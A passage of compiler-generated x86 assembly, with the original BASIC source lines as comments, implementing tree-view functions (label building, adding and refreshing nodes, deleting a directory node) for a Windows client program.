funcBody52.client:
;
; [1143] SHARED TTREE dtree[]
;
; [1144] STRING label
#ifdef getTreeCompLabel.label
#undef getTreeCompLabel.label
#endif
#define getTreeCompLabel.label ebp-40	; exposes local variable 'label'
;
;
; [1147] IFZ hItem THEN RETURN ""
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.006E.client			;;; i195
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func52.client			;;; i258
else.006E.client:
end.if.006E.client:
;
; [1148] upper = UBOUND(dtree[])
#ifdef getTreeCompLabel.upper
#undef getTreeCompLabel.upper
#endif
#define getTreeCompLabel.upper ebp-44	; exposes local variable 'upper'
;
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.233			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.233:
	dec	eax			;;; i596
	mov	d[ebp-44],eax			;;; i670
;
; [1149] label = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1150] DO
align 8
do.006F.client:
;
; [1151] found = 0
#ifdef getTreeCompLabel.found
#undef getTreeCompLabel.found
#endif
#define getTreeCompLabel.found ebp-48	; exposes local variable 'found'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1152] FOR i = upper TO 0 STEP -1' build complete label
#ifdef getTreeCompLabel.i
#undef getTreeCompLabel.i
#endif
#define getTreeCompLabel.i ebp-52	; exposes local variable 'i'
;
	mov	eax,d[ebp-44]			;;; i665
	mov	d[ebp-52],eax			;;; i670
	mov	eax,0			;;; i659
; .forlimit52.0070 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,1			;;; i659
	neg	eax			;;; i916
; .forstep52.0070 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
align 8
for.0070.client:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	mov	esi,d[ebp-60]			;;; i665
	or	esi,esi
	jns	> A.234
	xchg	eax,ebx
A.234:
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0070.client			;;; i154
;
; [1153] IF dtree[i].hItem == hItem THEN
	mov	eax,d[ebp-52]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	mov	ebx,d[ebp+8]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0071.client			;;; i219
;
; [1154] label = getTreeItemLabel (#tree_tab, hItem) + label
	push	[ebp+8]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func51.client			;;; i619
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1155] hItem = dtree[i].hParent
	mov	eax,d[ebp-52]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp+8],eax			;;; i670
;
; [1156] IFZ hItem THEN EXIT DO
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0072.client			;;; i195
	jmp	end.do.006F.client			;;; i144
else.0072.client:
end.if.0072.client:
;
; [1157] found = 1
	mov	eax,1			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1158] END IF
else.0071.client:
end.if.0071.client:
;
; [1159] NEXT i
do.next.0070.client:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-60]			;;; i665
	add	eax,ebx			;;; i238a
	mov	d[ebp-52],eax			;;; i670
	jmp	for.0070.client			;;; i238b
end.for.0070.client:
;
; [1160] IFZ found THEN CPrint ($$main,"error:getTreeCompLabel():: no label found: "+label)
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0073.client			;;; i195
	mov	eax,addr @_string.02C7.client			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
else.0073.client:
end.if.0073.client:
;
; [1161] LOOP WHILE (hItem != 0)
do.loop.006F.client:
	mov	eax,d[ebp+8]			;;; i665
	cmp	eax,0			;;; i684a
	jne	< do.006F.client			;;; i193
end.do.006F.client:
;
; [1163] RETURN label
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func52.client			;;; i258
;
; [1164] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getTreeCompLabel.client:  ;;; Function end label for Assembly Programmers.
end.func52.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func52.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func52.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  getTreeCompLabel ()  *****
;  *****
;
; [1166] FUNCTION refreshTreeNode (STRING dir)
.code
;
#ifdef refreshTreeNode.dir
#undef refreshTreeNode.dir
#endif
#define refreshTreeNode.dir ebp+8	; exposes function argument 'dir'
;
align 16
_refreshTreeNode.client@4:
;  *****
;  *****  FUNCTION  refreshTreeNode ()  *****
;  *****
func4F.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody4F.client:
;
; [1167] SHARED TTREE dtree[]
;
; [1168] SHARED index
data section 'globals$shared'
align	4
%index.client:	db 4 dup ?
.code
;
; [1171] IFZ dir THEN RETURN 0
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.239			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0074.client			;;; i192
A.239:
	mov	eax,0			;;; i659
	jmp	end.func4F.client			;;; i258
else.0074.client:
end.if.0074.client:
;
; [1172] hParent = XLONG(GetTokenEx (@dir,32,0))
#ifdef refreshTreeNode.hParent
#undef refreshTreeNode.hParent
#endif
#define refreshTreeNode.hParent ebp-40	; exposes local variable 'hParent'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [1173] IF (hParent == 0) THEN RETURN
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,0			;;; i684a
	jne	>> else.0075.client			;;; i219
	xor	eax,eax			;;; i862
	jmp	end.func4F.client			;;; i258
else.0075.client:
end.if.0075.client:
;
; [1174] dir = TRIM$(dir)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1175] IFZ dir THEN RETURN 0
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.240			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0076.client			;;; i192
A.240:
	mov	eax,0			;;; i659
	jmp	end.func4F.client			;;; i258
else.0076.client:
end.if.0076.client:
;
; [1176] IFZ dtree[] THEN DIM dtree[200]
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0077.client			;;; i195
	sub	esp,64			;;; i430
	mov	eax,200			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%dtree.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1049165812			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%dtree.client],eax			;;; i668
else.0077.client:
end.if.0077.client:
;
; [1179] IF (hParent == -1) THEN
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0078.client			;;; i219
;
; [1180] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func4F.client			;;; i258
;
; [1181] dtree[index].hItem = AddTreeViewItem (#tree_tab, $$TVI_ROOT, dir, 0, 0, $$TVI_LAST)
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk4F.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	-65534			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	-65536			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	func22.client			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,24			;;; i633
	mov	ebx,d[%index.client]			;;; i663a
	mov	ecx,d[%%%dtree.client]			;;; i663a
	imul	ebx,12			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	d[ebx+4],eax			;;; i13b
;
; [1182] dtree[index].hParent = 0
	mov	eax,d[%index.client]			;;; i663a
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1183] ELSE
	jmp	end.if.0078.client			;;; i107
else.0078.client:
;
; [1184] IF verifyTreeItem (hParent,dir) THEN
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-40]			;;; i674a
	call	func54.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	test	eax,eax			;;; i220
	jz	>> else.0079.client			;;; i221
;
; [1185] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func4F.client			;;; i258
;
; [1186] ELSE
	jmp	end.if.0079.client			;;; i107
else.0079.client:
;
; [1187] dtree[index].hItem = AddTreeViewItem (#tree_tab, hParent, dir, 1, 2,$$TVI_LAST)
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-48],eax			;;; i670
	push	-65534			;;; i656a
	push	2			;;; i656a
	push	1			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[ebp-40]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func22.client			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,24			;;; i633
	mov	ebx,d[%index.client]			;;; i663a
	mov	ecx,d[%%%dtree.client]			;;; i663a
	imul	ebx,12			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	d[ebx+4],eax			;;; i13b
;
; [1188] dtree[index].hParent = hParent
	mov	eax,d[%index.client]			;;; i663a
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[ebp-40]			;;; i665
	mov	d[eax],ebx			;;; i13b
;
; [1189] END IF
end.if.0079.client:
;
; [1190] END IF
end.if.0078.client:
;
; [1191] InvalidateRect (#tree_tab, 0, 0)' : UpdateWindow (#tree_tab)
;
; [0] EXTERNAL FUNCTION InvalidateRect (hwnd, lpRect, bErase)
	push	0			;;; i656a
	push	0			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_InvalidateRect@12			;;; i619
;
; [1193] INC index
	inc	d[%index.client]			;;; i85
;
; [1194] IF index > UBOUND(dtree[]) THEN REDIM dtree[index+200]
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.241			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.241:
	dec	eax			;;; i596
	mov	ebx,d[%index.client]			;;; i663a
	cmp	eax,ebx			;;; i684a
	jge	>> else.007A.client			;;; i219
	sub	esp,64			;;; i430
	mov	eax,d[%index.client]			;;; i663a
	add	eax,200			;;; i775
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%dtree.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1049165812			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_RedimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%dtree.client],eax			;;; i668
else.007A.client:
end.if.007A.client:
;
; [1195] RETURN dtree[index-1].hItem
	mov	eax,d[%index.client]			;;; i663a
	sub	eax,1			;;; i791
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	jmp	end.func4F.client			;;; i258
;
; [1196] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.refreshTreeNode.client:  ;;; Function end label for Assembly Programmers.
end.func4F.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  refreshTreeNode ()  *****
;  *****
;
; [1198] FUNCTION addToTree (STRING dir)
.code
;
#ifdef addToTree.dir
#undef addToTree.dir
#endif
#define addToTree.dir ebp+8	; exposes function argument 'dir'
;
align 16
_addToTree.client@4:
;  *****
;  *****  FUNCTION  addToTree ()  *****
;  *****
func4E.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody4E.client:
;
; [1199] SHARED TTREE dtree[]
;
; [1200] SHARED index
;
; [1203] IFZ dir THEN RETURN 0
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.245			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.007B.client			;;; i192
A.245:
	mov	eax,0			;;; i659
	jmp	end.func4E.client			;;; i258
else.007B.client:
end.if.007B.client:
;
; [1204] hParent = XLONG(GetTokenEx (@dir,32,0))
#ifdef addToTree.hParent
#undef addToTree.hParent
#endif
#define addToTree.hParent ebp-40	; exposes local variable 'hParent'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [1205] IF (hParent == 0) THEN RETURN
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,0			;;; i684a
	jne	>> else.007C.client			;;; i219
	xor	eax,eax			;;; i862
	jmp	end.func4E.client			;;; i258
else.007C.client:
end.if.007C.client:
;
; [1206] dir = TRIM$(dir)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1207] IFZ dir THEN RETURN 0
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.246			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.007D.client			;;; i192
A.246:
	mov	eax,0			;;; i659
	jmp	end.func4E.client			;;; i258
else.007D.client:
end.if.007D.client:
;
; [1208] IFZ dtree[] THEN DIM dtree[200]
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.007E.client			;;; i195
	sub	esp,64			;;; i430
	mov	eax,200			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%dtree.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1049165812			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%dtree.client],eax			;;; i668
else.007E.client:
end.if.007E.client:
;
; [1210] IF (hParent == -1) THEN
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.007F.client			;;; i219
;
; [1211] dtree[index].hItem = AddTreeViewItem (#tree_tab, $$TVI_ROOT, dir, 0, 0, $$TVI_LAST)
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk4E.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	-65534			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	-65536			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	func22.client			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,24			;;; i633
	mov	ebx,d[%index.client]			;;; i663a
	mov	ecx,d[%%%dtree.client]			;;; i663a
	imul	ebx,12			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	d[ebx+4],eax			;;; i13b
;
; [1212] dtree[index].hParent = 0
	mov	eax,d[%index.client]			;;; i663a
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1213] ELSE
	jmp	end.if.007F.client			;;; i107
else.007F.client:
;
; [1214] dtree[index].hItem = AddTreeViewItem (#tree_tab, hParent, dir, 1, 2,$$TVI_LAST)
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-48],eax			;;; i670
	push	-65534			;;; i656a
	push	2			;;; i656a
	push	1			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[ebp-40]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func22.client			;;; i619
	sub	esp,24			;;; xnt1i
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,24			;;; i633
	mov	ebx,d[%index.client]			;;; i663a
	mov	ecx,d[%%%dtree.client]			;;; i663a
	imul	ebx,12			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	d[ebx+4],eax			;;; i13b
;
; [1215] dtree[index].hParent = hParent
	mov	eax,d[%index.client]			;;; i663a
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[ebp-40]			;;; i665
	mov	d[eax],ebx			;;; i13b
;
; [1216] END IF
end.if.007F.client:
;
; [1217] InvalidateRect (#tree_tab, 0, 0)' : UpdateWindow (#tree_tab)
	push	0			;;; i656a
	push	0			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_InvalidateRect@12			;;; i619
;
; [1219] INC index
	inc	d[%index.client]			;;; i85
;
; [1220] IF index > UBOUND(dtree[]) THEN REDIM dtree[index+200]
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.247			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.247:
	dec	eax			;;; i596
	mov	ebx,d[%index.client]			;;; i663a
	cmp	eax,ebx			;;; i684a
	jge	>> else.0080.client			;;; i219
	sub	esp,64			;;; i430
	mov	eax,d[%index.client]			;;; i663a
	add	eax,200			;;; i775
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%dtree.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1049165812			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_RedimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%dtree.client],eax			;;; i668
else.0080.client:
end.if.0080.client:
;
; [1221] RETURN dtree[index-1].hItem
	mov	eax,d[%index.client]			;;; i663a
	sub	eax,1			;;; i791
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	jmp	end.func4E.client			;;; i258
;
; [1222] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.addToTree.client:  ;;; Function end label for Assembly Programmers.
end.func4E.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  addToTree ()  *****
;  *****
;
; [1224] FUNCTION TreeDelDir (hItem)
.code
;
#ifdef TreeDelDir.hItem
#undef TreeDelDir.hItem
#endif
#define TreeDelDir.hItem ebp+8	; exposes function argument 'hItem'
;
align 16
_TreeDelDir.client@4:
;  *****
;  *****  FUNCTION  TreeDelDir ()  *****
;  *****
func5C.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5C.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody5C.client:
;
; [1225] STRING dir,label
#ifdef TreeDelDir.dir
#undef TreeDelDir.dir
#endif
#define TreeDelDir.dir ebp-40	; exposes local variable 'dir'
;
#ifdef TreeDelDir.label
#undef TreeDelDir.label
#endif
#define TreeDelDir.label ebp-44	; exposes local variable 'label'
;
;
; [1228] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0081.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func5C.client			;;; i258
else.0081.client:
end.if.0081.client:
;
; [1229] label = getTreeItemLabel (#tree_tab, hItem)
	push	[ebp+8]			;;; i674a
	push	[%#tree_tab.client]			;;; i672a
	call	func51.client			;;; i619
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1230] IF RIGHT$(label,1) != "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.0082.client			;;; i219
;
; [1231] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func5C.client			;;; i258
;
; [1232] ELSE
	jmp	end.if.0082.client			;;; i107
else.0082.client:
;
; [1233] hParent = getTreeParent(hItem)
#ifdef TreeDelDir.hParent
#undef TreeDelDir.hParent
#endif
#define TreeDelDir.hParent ebp-48	; exposes local variable 'hParent'
;
	push	[ebp+8]			;;; i674a
	call	func53.client			;;; i619
	mov	d[ebp-48],eax			;;; i670
;
; [1234] IFZ hParent THEN RETURN 0
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0083.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func5C.client			;;; i258
else.0083.client:
end.if.0083.client:
;
; [1235] END IF
end.if.0082.client:
;
; [1237] dir = getTreeCompLabel(hItem)
	push	[ebp+8]			;;; i674a
	call	func52.client			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1238] IFZ dir THEN RETURN 0
	mov	eax,[ebp-40]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.251			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0084.client			;;; i192
A.251:
	mov	eax,0			;;; i659
	jmp	end.func5C.client			;;; i258
else.0084.client:
end.if.0084.client:
;
; [1240] SendMessageA (#tree_tab, $$TVM_DELETEITEM, 0, hItem)
	push	[ebp+8]			;;; i674a
	push	0			;;; i656a
	push	4353			;;; i656a
	push	[%#tree_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1241] SendSMessage(idx,"deldir "+STRING$(hParent)+" "+dir+"|"+label+"|")
#ifdef TreeDelDir.idx
#undef TreeDelDir.idx
#endif
#define TreeDelDir.idx ebp-52	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02DB.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1243] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func5C.client			;;; i258
;
; [1244] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.TreeDelDir.client:  ;;; Function end label for Assembly Programmers.
end.func5C.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5C.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func5C.client:
	mov	esi,[ebp-40]			;;; i665
